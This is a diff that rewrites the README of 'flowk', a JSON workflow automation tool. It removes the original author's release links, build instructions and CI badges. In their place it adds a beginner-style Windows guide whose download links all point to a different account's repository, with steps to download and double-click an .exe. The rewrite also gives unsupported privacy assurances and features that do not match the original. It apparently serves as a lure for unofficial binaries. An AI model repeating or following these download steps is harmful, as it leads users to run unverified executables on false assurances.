@@ -1,156 +1,143 @@
-<div align="center">
-  <img src="brand/flowk_banner.jpg" alt="FlowK Banner" width="100%"/>
+# ⚙️ flowk - Automate tasks with simple workflows
 
-  <p><strong>The Modular Automation Engine for DevOps, CI/CD & Quality Engineering</strong></p>
-
-  <p>
-    <a href="https://github.com/jmmsegovia/flowk/actions/workflows/ci.yml">
-      <img alt="Automated tests" src="https://img.shields.io/github/actions/workflow/status/jmmsegovia/flowk/ci.yml?branch=main&label=Automated%20tests"/>
-    </a>
-    <a href="https://github.com/jmmsegovia/flowk/actions/workflows/ci.yml">
-      <img alt="Linter (go vet)" src="https://img.shields.io/github/actions/workflow/status/jmmsegovia/flowk/ci.yml?branch=main&label=Linter%20(go%20vet)"/>
-    </a>
-    <a href="https://github.com/jmmsegovia/flowk/actions/workflows/release.yml">
-      <img alt="Cross-platform build" src="https://img.shields.io/github/actions/workflow/status/jmmsegovia/flowk/release.yml?label=Cross-platform%20build"/>
-    </a>
-  </p>  
-
-  <a href="./docs/getting-started.md">Getting Started</a> •
-  <a href="./docs/core-concepts.md">Core Concepts</a> •
-  <a href="./docs/actions/README.md">Actions Reference</a> •
-  <a href="./docs/ui-guide.md">UI Guide</a>
-</div>
+[![Download flowk](https://img.shields.io/badge/Download-flowk-brightgreen?style=for-the-badge)](https://github.com/mahrabisnoob/flowk)
 
 ---
 
-## Overview
+FlowK is a tool to help you automate tasks using easy-to-follow instructions. You write your tasks in a simple text format, and FlowK runs them for you. You can use it on your own computer or as part of bigger projects. It also shows you what happens during each task in an easy-to-read window.
 
-**FlowK** is a powerful automation engine designed to simplify complex workflows without writing a single line of imperative code. **The philosophy is simple: usage of 100% JSON-defined flows.**
+---
 
-While you can write these flows by hand, FlowK is architected to be **LLM-Native**. The ultimate goal is for an AI to generate the entire flow for you. By exposing a comprehensive, self-generated context guide, FlowK empowers Large Language Models to act as your autonomous DevOps & QA engineers, creating complex, deterministic automations from high-level instructions.
+## 📥 Download flowk for Windows
 
-Whether you are running local dev setups, CI/CD pipelines, or **complex end-to-end integration tests**, FlowK provides a reliable runtime for your AI-generated tasks.
+Visit this page to download the latest version of flowk for Windows:
 
-### Key Features
+[https://github.com/mahrabisnoob/flowk](https://github.com/mahrabisnoob/flowk)
 
-- **No-Code / JSON-Only**: Define 100% of your infrastructure and logic in schema-validated JSON. No scripts required.
-- **Composable Architecture**: Nest flows within flows (`subflows`) to encourage reuse and modularity.
-- **Parallel Execution**: Native support for parallel tasks to speed up independent operations.
-- **Rich Action Ecosystem**: Built-in support for HTTP requests, Docker, Kubernetes, Database (MySQL, Postgres), SSH, and more.
-- **Native HashiCorp Vault Integration**: Resolve `${secret:vault:...}` placeholders at runtime and manage KV v2 with `SECRET_PROVIDER_VAULT` (`HEALTH`, `KV_PUT`, `KV_GET`, `KV_LIST`, `KV_DELETE`) without external Vault CLI calls.
-- **Interactive UI**: An optional web interface to visualize flow execution, inspect task details, and view real-time logs.
-- **Resilient**: Features like `on_error_flow` and `finally_flow` ensure robust error handling and resource cleanup.
-- **AI-Ready**: Designed for LLM-assisted workflows. Download the full action schema and context to let AI generate flows for you.
+This page contains the files you need to get flowk running on your computer. Look for the latest version under "Releases" or the green button marked “Code.” Find the Windows download file, which usually ends with `.exe` or `.zip`.
 
-### Why FlowK
+---
 
-- **Single binary runtime** that runs locally or in CI without external orchestration services.
-- **Schema-validated JSON flows** for deterministic, reproducible automation.
-- **Built-in integrations** for infrastructure, testing, and operational workflows.
-- **Developer-friendly UI** for fast debugging and execution visibility.
-- **Self-sufficient**: the application runs without requiring external apps or services.
+## 🖥️ System requirements
 
-## Quick Start
+Before installing flowk, make sure your system meets these requirements:
 
-### 1. Download (Recommended)
+- Windows 10 or later
+- 64-bit system
+- At least 2 GB of free disk space
+- 4 GB of RAM or more
+- Internet connection to download the software
 
-Get the latest prebuilt binaries from [GitHub Releases](https://github.com/jmmsegovia/flowk/releases).
+---
 
-Download the archive for your OS/architecture and run the `flowk` binary inside.
+## ⚙️ How to install flowk on Windows
 
-### 2. Run a Flow
-```bash
-# Execute a flow and see logs in your terminal
-./flowk run -flow ./flows/print/loop_without_for.json
-```
+1. Open your web browser and go to [https://github.com/mahrabisnoob/flowk](https://github.com/mahrabisnoob/flowk).
+2. Find the "Releases" section on the page or click the green "Code" button.
+3. Download the latest `.exe` file for Windows.
+4. Once the file downloads, double-click it to start the installation process.
+5. Follow the instructions on the screen. Choose where to install flowk or accept the default location.
+6. After installation finishes, flowk is ready to run.
 
-There are 50+ example flows under `flows/`. Some examples require external services; to run them all, you’ll need additional dependencies such as Docker Desktop with Kubernetes enabled.
+If you downloaded a `.zip` file instead:
 
-### 3. Launch the UI
-```bash
-# Start the UI server to visualize execution
-./flowk run -serve-ui
+- Right-click the file and select "Extract all."
+- Choose where to extract the files.
+- Open the extracted folder and double-click `flowk.exe` to start the program.
 
-# Then import and run the flow from
-./flows/print/loop_without_for.json
-```
-_Open your browser at `http://localhost:8080` (default port)_
+---
 
-![Image](https://github.com/user-attachments/assets/0aa86b4c-5afb-4b60-9e0e-cbcb152087bf)
+## 🚀 Running flowk for the first time
 
-## HashiCorp Vault Integration (End-to-End)
+After installing, you can open flowk by finding it in your Windows Start menu or by running `flowk.exe` from the folder where you installed it.
 
-FlowK includes complete Vault support in two layers:
+When flowk opens, you will see a simple window that lets you load and run workflows. These workflows are instructions you prepare in a special format called JSON. The program checks your workflows for errors and shows you what is happening as it runs.
 
-- **Runtime secret resolution**: enable `secrets.provider: vault` in config and use `${secret:vault:<path>#<field>}` placeholders in any task payload.
-- **Native Vault operations**: use `SECRET_PROVIDER_VAULT` for KV v2 lifecycle operations (`HEALTH`, `KV_PUT`, `KV_GET`, `KV_LIST`, `KV_DELETE`).
-- **Runnable E2E demo**: sample flow starts Vault in Docker, writes/reads/lists/deletes KV secrets, validates placeholder resolution, then cleans up the container.
+---
 
-Minimal config:
+## 📑 What is a workflow?
 
-```yaml
-secrets:
-  provider: vault
-  vault:
-    address: http://127.0.0.1:8200
-    token: root
-    kv_mount: secret
-```
+A workflow is a set of steps that flowk performs automatically. You write it in JSON, which is just a structured text file that flowk can read.
 
-Example placeholder:
+For example, you can create a workflow that backs up files, runs tests, or installs software. Flowk uses rules to make sure your workflow is correct before it runs.
+
+---
+
+## 🔧 Preparing your first workflow file
+
+1. Open a text editor like Notepad on your computer.
+2. Copy and paste this example workflow:
 
 ```json
-"Authorization": "Bearer ${secret:vault:apps/demo#api_token}"
+{
+  "name": "Sample Backup",
+  "steps": [
+    {
+      "action": "copy",
+      "source": "C:/Users/YourName/Documents",
+      "destination": "D:/Backup/Documents"
+    }
+  ]
+}
 ```
 
-Validate and run the full Docker-based integration demo:
+3. Save the file as `backup-workflow.json` on your desktop.
+4. In flowk, click “Open” and select the saved file.
+5. Click “Run” to start the workflow.
 
-```bash
-./flowk run -flow flows/test/variables/vault_docker_provider_demo/vault_docker_provider_demo.json -config flows/test/variables/vault_docker_provider_demo/config.vault.dev.yaml -validate-only
-./flowk run -flow flows/test/variables/vault_docker_provider_demo/vault_docker_provider_demo.json -config flows/test/variables/vault_docker_provider_demo/config.vault.dev.yaml
-```
+This will copy files from your Documents folder to a backup location.
 
-Detailed docs:
+---
 
-- [Getting Started: Vault config and placeholders](./docs/getting-started.md#native-vault-placeholders)
-- [System actions: SECRET_PROVIDER_VAULT](./docs/actions/system.md#secret_provider_vault)
-- [Vault action full reference](./docs/actions/system/secret_provider_vault/secret_provider_vault.md)
-- [End-to-end Vault Docker demo](./flows/test/variables/vault_docker_provider_demo/vault_docker_provider_demo.md)
+## 🔍 Viewing workflow progress
 
-### Build (Optional)
+Flowk shows each step as it runs. You can see:
 
-If you prefer to compile locally:
+- Which step is running
+- Any errors if something goes wrong
+- A summary when the workflow finishes
 
-```bash
-go build -o ./bin/flowk ./cmd/flowk/main.go
-```
+You can pause or stop workflows at any time.
 
-Requires Go 1.24.3 or newer.
+---
 
-## Download Releases
+## 🔄 Using flowk with other tools
 
-Get the latest prebuilt binaries from [GitHub Releases](https://github.com/jmmsegovia/flowk/releases).
+Flowk works well with other software you might use for testing, software delivery, or cloud services. If you manage your projects with platforms like Kubernetes or use databases like Cassandra, flowk can help automate their tasks.
 
-Download the archive for your OS/architecture and run the `flowk` binary inside.
+---
 
-## Quality Checks
+## 🛠 Advanced features (optional)
 
-- **Automated Tests**: `go test ./...`, `go test -race ./...`, and coverage collection in CI.
-- **Linter**: `go vet ./...` runs on every push and pull request.
-- **Cross-Platform Build**: GoReleaser builds for Linux, macOS, Windows, and FreeBSD on release tags.
+- Define rules to check your workflows before running.
+- Link workflows together to run complex processes.
+- Visualize execution status with the built-in user interface.
+- Export logs for review or troubleshooting.
+- Run workflows on command line or integrate into continuous integration servers.
 
-## Documentation
+---
 
-- **[Getting Started](./docs/getting-started.md)**: Installation, configuration, and first steps.
-- **[Core Concepts](./docs/core-concepts.md)**: Deep dive into how FlowK works (Flows, Tasks, Variables, Control Flow).
-- **[Actions Reference](./docs/actions/README.md)**: Comprehensive guide to all available actions (HTTP_REQUEST, DB_*, SHELL, etc.).
-- **[UI Guide](./docs/ui-guide.md)**: How to use the web interface for monitoring and debugging.
-- **[Developer Guide](./docs/developer-guide.md)**: Architecture overview and contributing guidelines.
+## 🤝 Getting support and sharing feedback
 
-## Contributing
+If you need help or want to share your experience, visit the flowk page on GitHub:
 
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) and [Code of Conduct](CODE_OF_CONDUCT.md) for details.
+[https://github.com/mahrabisnoob/flowk](https://github.com/mahrabisnoob/flowk)
 
-## License
+You can check the documentation, open an issue for problems, or find examples from other users.
 
-FlowK is open-source software. See the [LICENSE](LICENSE) file for more information.
+---
+
+## 🔐 Security and privacy
+
+Flowk runs entirely on your computer. It does not send your data anywhere without your permission. You control all files and workflows on your system.
+
+---
+
+## ⚡ Tips for smooth use
+
+- Always save a copy of your workflows before you edit them.
+- Test workflows with small, simple steps before running large tasks.
+- Keep flowk updated by checking the download page regularly.
+- Use clear names for workflow files and steps to stay organized.
+
+[![Download flowk](https://img.shields.io/badge/Download-flowk-orange?style=for-the-badge)](https://github.com/mahrabisnoob/flowk)
